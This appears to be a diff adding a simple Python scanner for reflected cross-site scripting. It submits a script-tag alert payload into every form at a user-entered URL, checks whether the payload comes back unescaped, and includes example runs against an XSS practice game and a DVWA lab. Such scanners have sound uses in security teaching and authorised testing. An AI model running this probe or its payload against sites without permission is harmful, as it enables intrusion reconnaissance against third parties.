@@ -66,3 +66,53 @@ def submit_form(form_details, url, value):
         return requests.post(target_url, data=data)
     else:
         return requests.get(target_url, params=data)
+
+#Prints all XSS vulnerabilities for the given url and asses if it is
+#vulnerable or not 
+def scan_xss(url):
+    #Gets all forms for the url
+    forms = get_all_forms(url)
+    #Outputs the number of forms for the given url
+    print(f"[+] Detected {len(forms)} forms on {url}.")
+    #HTTP and JS code that will test URL for XSS vulnerabilities
+    js_script = "<script> alert('Ready for XSS') </script>"
+    is_vulnerable = False
+    for form in forms:
+        #Places all form details and atributes in a varible
+        form_details = get_form_details(form)
+        #Submits the form with all the parameters collected
+        content = submit_form(form_details, url, js_script).content.decode()
+        #Checks url and JS code to determine XSS
+        if js_script in content:
+            print(f"[+] XSS Detected on {url}")
+            print(f"[*] Form details:")
+            pprint(form_details)
+            is_vulnerable = True
+    return is_vulnerable
+
+#Main
+#Begins the script by asking the user for an URL to be analyze
+if __name__ == "__main__":
+    url = input("Enter a URL to test for XSS:") 
+    print(scan_xss(url))
+
+##############
+##### EXAMPLE RESULTS #####
+
+# CASE 1
+# Enter a URL to test for XSS:https://xss-game.appspot.com/level1/frame
+# [+] Detected 1 forms on https://xss-game.appspot.com/level1/frame.
+# [+] XSS Detected on https://xss-game.appspot.com/level1/frame
+# [*] Form details:
+# {'action': '',
+#  'inputs': [{'name': 'query',
+#              'type': 'text',
+#              'value': "<script> alert('You have been hacked') </script>"},
+#             {'name': None, 'type': 'submit'}],
+#  'method': 'get'}
+# True
+
+# CASE 2
+# Enter a URL to test for XSS:http://dvwa.local/login.php
+# [+] Detected 1 forms on http://dvwa.local/login.php.
+# False
